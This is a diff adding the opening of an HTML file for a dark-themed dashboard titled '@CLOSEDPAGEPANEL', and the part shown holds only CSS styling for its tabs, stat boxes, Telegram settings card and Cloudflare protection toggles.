@@ -1,0 +1,3875 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>@CLOSEDPAGEPANEL</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+
+:root{
+  --bg-0:#000000;
+  --bg-1:#fff;
+  --bg-2:#0a0a0a;
+  --panel:#000000;
+  --border:#333333;
+  --border-active:#00ff41;
+  --text:#e0e0e0;
+  --text-dim:#888888;
+  --accent:#00ff41;
+  --accent-dim:rgba(0, 255, 65, 0.2);
+  --accent-2:#008F11;
+  --accent-3:#b000ff;
+  --danger:#ff3333;
+  --shadow:0 0 20px rgba(0, 255, 65, 0.1);
+  --glow:0 0 5px var(--accent);
+  --font-mono: 'JetBrains Mono', 'Courier New', monospace;
+  
+  /* Professional Semantic Colors */
+  --c-success: #10b981; /* Emerald */
+  --c-error: #ef4444;   /* Red */
+  --c-info: #3b82f6;    /* Blue */
+  --c-warn: #f59e0b;    /* Amber */
+  --c-primary: #8b5cf6; /* Violet */
+}
+::placeholder {
+  color: #000000 !important;
+  opacity: 1;
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:var(--font-mono);
+  margin:0;
+  background-color:var(--bg-0);
+  color:var(--text);
+  overflow-x:hidden;
+}
+body::after {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background: repeating-linear-gradient(
+    0deg,
+    rgba(0, 0, 0, 0.15),
+    rgba(0, 0, 0, 0.15) 1px,
+    transparent 1px,
+    transparent 2px
+  );
+  pointer-events: none;
+  z-index: 9999;
+}
+.app{min-height:100%;display:flex;flex-direction:column;position:relative;z-index:1}
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:6px ;
+  border-bottom:1px solid var(--border);
+}
+.brand{
+  display:flex;align-items:center;gap:12px;
+  font-size:10px;font-weight:700;letter-spacing:1px;
+  color:var(--c-info);
+  text-transform:uppercase;
+}
+.brand-dot{
+  width:12px;height:12px;
+  background:var(--c-info);
+  box-shadow:var(--glow);
+  animation: blink 2s infinite;
+}
+
+.status-dot {
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background-color: var(--danger); /* Default to red (not protected) */
+  box-shadow: 0 0 5px var(--danger); /* Default glow */
+  transition: background-color 0.3s ease, box-shadow 0.3s ease;
+}
+
+.status-dot.active {
+  background-color: var(--accent); /* Green for protected */
+  box-shadow: 0 0 5px var(--accent); /* Green glow */
+}
+
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+.nav{display:flex;gap:12px}
+.nav button{
+  padding:8px 16px;
+  border:1px solid var(--border);
+  background:transparent;
+  color:var(--c-info);
+  border-radius:0;
+  cursor:pointer;
+  font-family:var(--font-mono);
+  font-size:12px;
+  text-transform:uppercase;
+  transition:all 0.2s ease;
+}
+.nav button:hover{
+  border-color:var(--accent);
+  color:var(--c-info);
+  box-shadow:var(--glow);
+  text-shadow:0 0 5px var(--accent);
+}
+.nav button.active{
+  border-color:var(--accent);
+  background:var(--accent-dim);
+  color:var(--c-info);
+  box-shadow:var(--glow);
+}
+.container{width:97%;margin:0;padding-left:30px;}
+.main{
+  padding:0px;
+}
+.main::before {
+  content:"";position:absolute;top:-1px;right:-1px;width:20px;height:20px;
+  border-top:2px solid var(--accent);border-right:2px solid var(--accent);
+}
+h1{
+  font-size:24px;margin:0 0 24px;
+  color:var(--text);
+  text-transform:uppercase;
+  padding-left:16px;
+}
+.grid{display:grid;grid-template-columns:1fr 2fr;gap:16px;align-items:center}
+label{font-size:12px;color:var(--accent);text-transform:uppercase;letter-spacing:1px}
+input[type="text"],input[type="url"],input[type="number"],input[type="password"]{
+  width:100%;
+  padding:12px;
+  border:1px solid var(--border);
+  background:var(--bg-1);
+  color:var(--accent);
+  font-family:var(--font-mono);
+  border-radius:0;
+  transition:all 0.2s;
+}
+input:focus{
+  outline:none;
+  border-color:var(--accent);
+  box-shadow:var(--glow);
+  background:rgba(0, 255, 65, 0.05);
+}
+input[type="checkbox"]{
+  appearance:none;
+  width:20px;height:20px;
+  border:1px solid var(--border);
+  background:var(--bg-1);
+  cursor:pointer;
+  position:relative;
+}
+input[type="checkbox"]:checked{
+  background:var(--accent);
+  border-color:var(--accent);
+  box-shadow:var(--glow);
+}
+input[type="checkbox"]:checked::after{
+  content:'X';
+  position:absolute;
+  top:50%;left:50%;
+  transform:translate(-50%, -50%);
+  color:#000;
+  font-size:14px;
+  font-weight:bold;
+}
+.row{display:flex;gap:16px;margin-top:32px}
+button{
+  padding:12px 24px;
+  border:1px solid var(--accent);
+  background:transparent;
+  color:var(--accent);
+  cursor:pointer;
+  font-family:var(--font-mono);
+  font-size:14px;
+  text-transform:uppercase;
+  letter-spacing:1px;
+  transition:all 0.2s;
+  position:relative;
+  overflow:hidden;
+}
+button:hover{
+  background:var(--accent);
+  color:#000;
+  box-shadow:var(--glow);
+}
+button.secondary{
+  border-color:var(--text-dim);
+  color:var(--text-dim);
+}
+button.secondary:hover{
+  border-color:var(--text);
+  color:var(--text);
+  background:var(--border);
+  box-shadow:none;
+}
+button.primary {
+  border-color: var(--c-info);
+  color: var(--c-info);
+}
+button.primary:hover {
+  background: var(--c-info);
+  color: #000;
+  box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
+}
+.status{margin-top:16px;font-size:12px;color:var(--text-dim);font-family:var(--font-mono)}
+.table-wrap{
+  overflow:auto;
+  margin-top:24px;
+  border:1px solid var(--border);
+}
+table{width:100%;border-collapse:collapse;font-size:12px;color:var(--text)}
+thead tr{background:var(--bg-2);border-bottom:1px solid var(--accent)}
+th{
+  padding:12px;
+  text-align:left;
+  text-transform:uppercase;
+  color:var(--accent);
+  font-weight:normal;
+}
+td{padding:12px;border-bottom:1px solid #1a1a1a}
+tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
+.badge{
+  display:inline-block;
+  padding:2px 8px;
+  border:1px solid var(--border);
+  color:var(--text-dim);
+  text-transform:uppercase;
+  font-size:10px;
+}
+.test-fail{border:1px solid var(--danger) !important;box-shadow:0 0 10px rgba(255, 51, 51, 0.3) !important;}
+.controls{display:flex;gap:12px;align-items:center;justify-content:space-between;margin-bottom:16px}
+.muted{color:var(--text-dim)}
+::-webkit-scrollbar {width: 8px;height: 8px;}
+::-webkit-scrollbar-track {background: var(--bg-1);}
+::-webkit-scrollbar-thumb {background: var(--border);border: 1px solid var(--bg-1);}
+::-webkit-scrollbar-thumb:hover {background: var(--accent);}
+.settings-header {display: flex;justify-content: space-between;align-items: center;margin-bottom: 24px;border-bottom: 1px solid var(--border);padding-bottom: 12px;}
+.settings-header h1 {margin: 0;border: none;padding: 0;font-size: 20px;color: var(--text);text-transform: uppercase;}
+.settings-nav {display: flex;gap: 2px;}
+.tab-btn {padding: 8px 16px;background: var(--bg-1);border: 1px solid var(--border);color: var(--text-dim);cursor: pointer;font-family: var(--font-mono);font-size: 12px;text-transform: uppercase;transition: all 0.2s;}
+.tab-btn:hover {color: var(--accent);border-color: var(--accent);}
+.tab-btn.active {background: var(--accent-dim);color: var(--accent);border-color: var(--accent);box-shadow: var(--glow);}
+
+/* Modern Consolidated Navigation Styles */
+.modern-nav-container {
+  border-radius: 12px;
+  margin: 24px 0; /* Adjusted: 0 top, 24px bottom */
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+  transition: all 0.3s ease;
+}
+
+.modern-nav-container:hover {
+  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+  transform: translateY(-2px);
+  
+}
+
+.modern-nav-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 2px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+.modern-nav-icon {
+  width: 24px;
+  height: 24px;
+  background: linear-gradient(135deg, var(--accent) 0%, var(--c-primary) 100%);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  color: white;
+  box-shadow: 0 0 10px rgba(0, 123, 255, 0.3);
+}
+
+.modern-nav-title {
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--text);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.modern-nav-tabs {
+  display: flex;
+  gap: 8px;
+  background: rgba(255, 255, 255, 0.05);
+  border-radius: 8px;
+  padding: 4px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.modern-tab-btn {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 16px;
+  background: transparent;
+  border: none;
+  border-radius: 6px;
+  color: var(--text-dim);
+  font-family: var(--font-mono);
+  font-size: 25px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  flex: 1;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+}
+
+.modern-tab-btn:hover {
+  color: var(--accent);
+  background: rgba(255, 255, 255, 0.1);
+  transform: translateY(-1px);
+}
+
+.modern-tab-btn.active {
+  background: linear-gradient(135deg, var(--accent-dim) 0%, var(--c-primary) 100%);
+  color: white;
+  box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
+  transform: translateY(-1px);
+}
+
+.modern-tab-btn.active .tab-icon {
+  filter: brightness(1.2);
+}
+
+.tab-icon {
+  font-size: 14px;
+  transition: all 0.3s ease;
+}
+
+.tab-label {
+  transition: all 0.3s ease;
+}
+
+/* Responsive Design */
+@media (max-width: 968px) {
+  .modern-nav-container {
+    padding: 16px;
+  }
+  
+  .modern-nav-tabs {
+    flex-direction: column;
+  }
+  
+  .modern-tab-btn {
+    justify-content: flex-start;
+  }
+}
+
+/* Enhanced Layout with Sidebar */
+.settings-layout {
+  display: block;
+}
+
+.settings-main {
+  order: 1;
+}
+
+.settings-sidebar {
+  order: 2;
+  display: block;
+  top: 4px;
+}
+
+/* Modern Analysis Dashboard Sidebar */
+.modern-analysis-sidebar {
+  padding: 5px;
+  box-shadow: 0 4px 20px rgba(59, 130, 246, 0.1);
+  transition: all 0.3s ease;
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 12px;
+  margin:10px 0;
+}
+
+.modern-analysis-sidebar:hover {
+  box-shadow: 0 8px 30px rgba(59, 130, 246, 0.2);
+  transform: translateY(-2px);
+}
+
+.analysis-sidebar-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 6px;
+  padding-bottom: 12px;
+  border-bottom: none;
+  grid-column: 1 / -1;
+}
+
+.analysis-sidebar-icon {
+  font-size: 16px;
+  color: var(--c-info);
+}
+
+.analysis-sidebar-title {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--c-info);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+/* Compact Analysis Boxes for Sidebar */
+.analysis-box-compact {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 6px;
+  padding: 12px;
+  transition: all 0.2s ease;
+}
+
+.analysis-box-compact:hover {
+  border-color: var(--c-info);
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.analysis-box-compact .analysis-value {
+  font-size: 58px;
+  font-weight: 700;
+  margin-bottom: 2px;
+}
+
+.analysis-box-compact .analysis-label {
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  opacity: 0.8;
+}
+
+/* Responsive Sidebar */
+@media (max-width: 1024px) {
+  .settings-layout {
+    grid-template-columns: 1fr;
+    gap: 16px;
+  }
+  
+  .settings-main {
+    order: 1;
+  }
+  
+  .settings-sidebar {
+    order: 2;
+    position: relative;
+    top: 0;
+  }
+  
+  .modern-analysis-sidebar {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  
+  .analysis-sidebar-header {
+    grid-column: 1 / -1;
+  }
+}
+
+@media (max-width: 768px) {
+  .modern-analysis-sidebar {
+    grid-template-columns: 1fr;
+  }
+}
+
+/* Enhanced Content Organization */
+.settings-content-wrapper {
+  margin-top: 24px;
+}
+
+/* Enhanced Header Hierarchy */
+.tab-content h3 {
+  margin-top: 0;
+  margin-bottom: 16px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+  color: var(--accent);
+  text-transform: uppercase;
+  font-size: 14px;
+  letter-spacing: 1px;
+  order: -1;
+}
+
+/* Deployment Links Enhancement */
+#deployment-links-container {
+  order: 0;
+  margin-bottom: 14px !important;
+  border-radius: 8px !important;
+  box-shadow: 0 2px 10px rgba(59, 130, 246, 0.1) !important;
+}
+
+/* Status Message Enhancement */
+.status {
+  margin-top: 16px !important;
+  padding: 12px 16px;
+  border-radius: 6px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  font-family: var(--font-mono);
+  font-size: 12px;
+  text-align: center;
+  transition: all 0.3s ease;
+}
+
+.status:not(:empty) {
+  background: rgba(16, 185, 129, 0.1);
+  border-color: var(--c-success);
+  color: var(--c-success);
+}
+
+/* Enhanced Tab Switching Animation */
+.tab-content { display: none; animation: fadeInUp 0.4s ease-out; }
+.tab-content.active { display: flex; flex-direction: column; gap: 24px; }
+
+@keyframes fadeInUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* Tab Button Ripple Effect */
+.modern-tab-btn::before {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 0;
+  height: 0;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.3);
+  transform: translate(-50%, -50%);
+  transition: width 0.6s, height 0.6s;
+}
+
+.modern-tab-btn:active::before {
+  width: 300px;
+  height: 300px;
+}
+.compact-grid {display: grid;grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));gap: 16px;align-items: start;}
+.form-group {display: flex;flex-direction: column;gap: 6px;}
+.form-group label {font-size: 11px;color: var(--accent);text-transform: uppercase;letter-spacing: 1px;}
+.form-group input[type="text"],.form-group input[type="url"],.form-group input[type="number"],.form-group input[type="password"] {width: 100%;padding: 8px 12px;background: var(--bg-1);border: 1px solid var(--border);color: #000000;font-family: var(--font-mono);font-size: 13px;}
+.form-group select {width: 100%;padding: 8px 12px;background: var(--bg-1);border: 1px solid var(--border);color: var(--text);font-family: var(--font-mono);font-size: 13px;}
+.form-group input:focus {border-color: var(--accent);box-shadow: var(--glow);outline: none;}
+.form-group select:focus {border-color: var(--accent);box-shadow: var(--glow);outline: none;}
+.form-group select[multiple] {padding: 8px 12px;overflow: auto;}
+.form-group.checkbox {
+  flex-direction: row;
+  align-items: center;
+  justify-content: space-between;
+  border: 1px solid var(--border);
+  padding: 12px 16px;
+  background: var(--bg-1);
+  transition: all 0.3s ease;
+  border-radius: 0; /* Professional sharp edges */
+  position: relative;
+}
+.form-group.checkbox:hover {
+  border-color: var(--text-dim);
+  background: var(--bg-2);
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+}
+/* Optional: Left accent border for settings boxes */
+.form-group.checkbox::before {
+  content: "";
+  position: absolute;
+  left: 0; top: 0; bottom: 0; width: 3px;
+  background: var(--border);
+  transition: background 0.3s ease;
+}
+.form-group.checkbox:hover::before {
+  background: var(--accent);
+}
+.form-group.checkbox label {margin: 0;cursor: pointer;flex: 1;}
+.actions-row {margin-top: 24px;padding-top: 16px;border-top: 1px solid var(--border);display: flex;justify-content: flex-end;gap: 12px;}
+.tooltip-icon {display: inline-block;margin-left: 6px;width: 14px;height: 14px;line-height: 14px;text-align: center;border-radius: 50%;border: 1px solid var(--text-dim);color: var(--text-dim);font-size: 10px;cursor: help;}
+.tooltip-icon:hover {border-color: var(--accent);color: var(--accent);}
+.modal-overlay {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;align-items:center;justify-content:center;}
+.modal {background:var(--bg-2);border:1px solid var(--accent);width:90%;max-width:800px;max-height:90vh;display:flex;flex-direction:column;box-shadow:0 0 50px rgba(0,255,65,0.2);}
+.modal-header {padding:16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;background:var(--bg-1);}
+.modal-title {color:var(--accent);font-weight:bold;text-transform:uppercase;}
+.modal-close {cursor:pointer;color:var(--text-dim);font-size:20px;}
+.modal-close:hover {color:var(--danger);}
+.modal-body {padding:16px;overflow:auto;flex:1;}
+.code-block {background:#000;border:1px solid var(--border);padding:16px;font-family:monospace;white-space:pre-wrap;color:var(--text);font-size:12px;max-height: 400px; overflow: auto;}
+.analysis-dashboard {display: grid;grid-template-columns: repeat(4, 1fr);gap: 16px;margin-bottom: 24px;}
+.analysis-box {
+  background: var(--bg-1);
+  border: 1px solid var(--border);
+  border-top: 3px solid var(--border); /* Default top border */
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
+  position: relative;
+  overflow: hidden;
+}
+.analysis-box::before {
+  content: "";
+  position: absolute;
+  top: 0; left: 0; width: 100%; height: 100%;
+  background: linear-gradient(180deg, rgba(255,255,255,0.03) 0%, transparent 100%);
+  opacity: 0;
+  transition: opacity 0.3s ease;
+}
+.analysis-box:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+}
+.analysis-box:hover::before {
+  opacity: 1;
+}
+
+/* Semantic Box Styles */
+.analysis-box.box-success { border-top-color: var(--c-success); }
+.analysis-box.box-success .analysis-value { color: var(--c-success); text-shadow: 0 0 20px rgba(16, 185, 129, 0.3); }
+.analysis-box.box-success:hover { box-shadow: 0 10px 30px rgba(16, 185, 129, 0.15); }
+
+.analysis-box.box-error { border-top-color: var(--c-error); }
+.analysis-box.box-error .analysis-value { color: var(--c-error); text-shadow: 0 0 20px rgba(239, 68, 68, 0.3); }
+.analysis-box.box-error:hover { box-shadow: 0 10px 30px rgba(239, 68, 68, 0.15); }
+
+.analysis-box.box-info { border-top-color: var(--c-info); }
+.analysis-box.box-info .analysis-value { color: var(--c-info); text-shadow: 0 0 20px rgba(59, 130, 246, 0.3); }
+.analysis-box.box-info:hover { box-shadow: 0 10px 30px rgba(59, 130, 246, 0.15); }
+
+.analysis-box.box-primary { border-top-color: var(--c-primary); }
+.analysis-box.box-primary .analysis-value { color: var(--c-primary); text-shadow: 0 0 20px rgba(139, 92, 246, 0.3); }
+.analysis-box.box-primary:hover { box-shadow: 0 10px 30px rgba(139, 92, 246, 0.15); }
+
+.analysis-value {font-size: 28px;font-weight: 700;color: var(--text);margin-bottom: 4px; transition: color 0.3s ease;}
+.analysis-label {font-size: 11px;color: var(--text-dim);text-transform: uppercase;letter-spacing: 1px;text-align: center;}
+
+/* Modern Telegram Configuration Styles */
+.telegram-config {
+  border-radius: 12px;
+  margin: 6px 0;
+  margin-bottom: 0 !important;
+  box-shadow: 0 4px 20px rgba(59, 130, 246, 0.1);
+  transition: all 0.3s ease;
+}
+
+.telegram-config:hover {
+  box-shadow: 0 8px 30px rgba(59, 130, 246, 0.2);
+  transform: translateY(-2px);
+}
+
+.telegram-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 1px;
+  padding-bottom: 6px;
+
+}
+
+.telegram-title {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--c-info);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.telegram-icon {
+  width: 24px;
+  height: 24px;
+  background: var(--c-info);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  color: white;
+  box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
+}
+
+/* Modern Toggle Switch */
+.telegram-toggle {
+  position: relative;
+  display: inline-block;
+  width: 60px;
+  height: 30px;
+}
+
+.telegram-toggle input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+
+.toggle-slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: rgba(255, 255, 255, 0.1);
+  transition: 0.3s;
+  border-radius: 30px;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.toggle-slider:before {
+  position: absolute;
+  content: "";
+  height: 22px;
+  width: 22px;
+  left: 4px;
+  bottom: 4px;
+  background-color: white;
+  transition: 0.3s;
+  border-radius: 50%;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.telegram-toggle input:checked + .toggle-slider {
+  background-color: var(--c-info);
+  box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
+}
+
+.telegram-toggle input:checked + .toggle-slider:before {
+  transform: translateX(30px);
+}
+
+/* Telegram Details Container */
+.telegram-details {
+  margin-top: 24px;
+  padding-top: 24px;
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+  animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+  from {
+    opacity: 0;
+    transform: translateY(-10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.telegram-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 20px;
+  margin-bottom: 20px;
+}
+
+.telegram-field {
+  position: relative;
+}
+
+.telegram-field label {
+  display: block;
+  margin-bottom: 8px;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.telegram-field input {
+  width: 100%;
+  padding: 12px 16px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 8px;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 14px;
+  transition: all 0.2s ease;
+}
+
+.telegram-field input:focus {
+  outline: none;
+  border-color: var(--c-info);
+  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.telegram-field input::placeholder {
+  color: #ffffff !important;
+  opacity: 1;
+}
+
+/* Test Button */
+.telegram-test-btn {
+  background: linear-gradient(135deg, var(--c-info) 0%, var(--c-primary) 100%);
+  border: none;
+  padding: 12px 24px;
+  border-radius: 8px;
+  color: white;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+}
+
+.telegram-test-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
+}
+
+.telegram-test-btn:active {
+  transform: translateY(0);
+}
+
+.telegram-test-btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+  transform: none;
+}
+
+/* Unified Cloudflare Control Styles - Compact Side Theme */
+.unified-cloudflare-control {
+  background: rgba(139, 92, 246, 0.05);
+  border-left: 3px solid var(--c-primary);
+  border-radius: 4px;
+  padding: 3px; /* Reduced from 16px */
+  margin: 2px 0; /* Reduced from 16px */
+  position: relative;
+  overflow: hidden;
+}
+
+@keyframes scan-light {
+  0% { left: -50%; opacity: 0; }
+  50% { opacity: 1; }
+  100% { left: 150%; opacity: 0; }
+}
+
+.unified-cloudflare-control.scanning::after {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: -50%;
+  width: 50%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.4), transparent);
+  transform: skewX(-20deg);
+  animation: scan-light 1.5s infinite linear;
+  pointer-events: none;
+  z-index: 10;
+}
+
+.unified-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 2px; /* Reduced from 5px */
+}
+
+.unified-title {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--c-primary);
+  display: flex;
+  align-items: center;
+  gap: 6px; /* Reduced from 8px */
+}
+
+.unified-toggle {
+  transform: scale(0.8); /* Reduced from 0.9 */
+}
+
+.unified-status {
+  text-align: left;
+  font-size: 10px; /* Reduced from 11px */
+  color: var(--text-dim);
+  margin-bottom: 6px; /* Reduced from 12px */
+  padding: 2px 0; /* Reduced from 4px */
+  border-bottom: 1px solid rgba(139, 92, 246, 0.1);
+  background: transparent;
+  display: flex;
+  align-items: center;
+  gap: 4px; /* Reduced from 6px */
+}
+
+.unified-status::before {
+  content: "STATUS:";
+  font-weight: 700;
+  color: var(--c-primary);
+  font-size: 9px; /* Reduced from 10px */
+}
+
+.unified-features {
+  display: grid;
+  gap: 4px; /* Reduced from 8px */
+  margin-bottom: 8px; /* Reduced from 16px */
+}
+
+.feature-item {
+  display: flex;
+  align-items: center;
+  gap: 6px; /* Reduced from 8px */
+  padding: 4px 8px; /* Reduced from 6px 10px */
+  background: rgba(0, 0, 0, 0.2);
+  border-radius: 4px;
+  border: 1px solid transparent;
+}
+
+.feature-icon {
+  font-size: 11px; /* Reduced from 12px */
+}
+
+.feature-text {
+  flex: 1;
+  font-size: 10px; /* Reduced from 11px */
+  color: #ffffff;
+}
+
+.feature-status {
+  font-size: 10px; /* Reduced from 11px */
+  min-width: 16px;
+  text-align: center;
+}
+
+.unified-actions {
+  display: flex;
+  gap: 6px; /* Reduced from 8px */
+  justify-content: flex-start;
+}
+
+.unified-actions .cloudflare-btn {
+  padding: 4px 10px; /* Reduced from 6px 12px */
+  font-size: 10px; /* Reduced from 11px */
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+  .telegram-grid {
+    grid-template-columns: 1fr;
+    gap: 16px;
+  }
+  
+  .telegram-config {
+    padding: 20px;
+    margin: 16px 0;
+  }
+  
+  .telegram-header {
+    flex-direction: column;
+    gap: 16px;
+    align-items: flex-start;
+  }
+}
+
+/* Modern Cloudflare Configuration Styles */
+.cloudflare-config {
+  background: linear-gradient(135deg, rgba(245, 158, 11, 0.1) 0%, rgba(239, 68, 68, 0.1) 100%);
+  border-left: 3px solid var(--c-warn);
+  border-radius: 4px; /* Reduced from 12px to match unified-cloudflare-control style if needed, or keep 12px */
+  padding: 10px;
+  margin: 0; 
+  box-shadow: 0 4px 20px rgba(245, 158, 11, 0.1);
+  transition: all 0.3s ease;
+}
+
+.cloudflare-config:hover {
+  box-shadow: 0 8px 30px rgba(245, 158, 11, 0.2);
+  transform: translateY(-2px);
+}
+
+.cloudflare-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 20px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid rgba(245, 158, 11, 0.3);
+}
+
+.cloudflare-title {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--c-warn);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.cloudflare-icon {
+  width: 24px;
+  height: 24px;
+  background: var(--c-warn);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  color: white;
+  box-shadow: 0 0 10px rgba(245, 158, 11, 0.5);
+}
+
+/* Cloudflare Security Cards */
+.cloudflare-security {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: 16px;
+  margin-bottom: 24px;
+}
+
+.security-card {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 8px;
+  padding: 16px;
+  transition: all 0.3s ease;
+}
+
+.security-card:hover {
+  border-color: var(--c-warn);
+  transform: translateY(-1px);
+}
+
+.security-card.core-security {
+  border-left: 4px solid var(--c-warn);
+}
+
+.security-card.bot-shield {
+  border-left: 4px solid var(--c-error);
+}
+
+.security-card.under-attack {
+  border-left: 4px solid var(--c-error);
+}
+
+.security-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 8px;
+}
+
+.security-title {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.security-status {
+  font-size: 10px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  padding: 2px 6px;
+  border-radius: 3px;
+}
+
+.security-status.active {
+  background: var(--c-warn);
+  color: black;
+}
+
+.security-status.inactive {
+  background: rgba(255, 255, 255, 0.1);
+  color: var(--text-dim);
+}
+
+/* Cloudflare Toggle Switch */
+.cloudflare-toggle {
+  position: relative;
+  display: inline-block;
+  width: 50px;
+  height: 24px;
+}
+
+.cloudflare-toggle input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+
+.cloudflare-slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: rgba(255, 255, 255, 0.1);
+  transition: 0.3s;
+  border-radius: 24px;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.cloudflare-slider:before {
+  position: absolute;
+  content: "";
+  height: 18px;
+  width: 18px;
+  left: 3px;
+  bottom: 3px;
+  background-color: white;
+  transition: 0.3s;
+  border-radius: 50%;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.cloudflare-toggle input:checked + .cloudflare-slider {
+  background-color: var(--c-warn);
+  box-shadow: 0 0 15px rgba(245, 158, 11, 0.5);
+}
+
+.cloudflare-toggle input:checked + .cloudflare-slider:before {
+  transform: translateX(26px);
+}
+
+/* Cloudflare Input Fields (Restored & Updated) */
+.cloudflare-fields {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+  gap: 16px;
+  margin-bottom: 20px;
+}
+
+.cloudflare-field {
+  position: relative;
+}
+
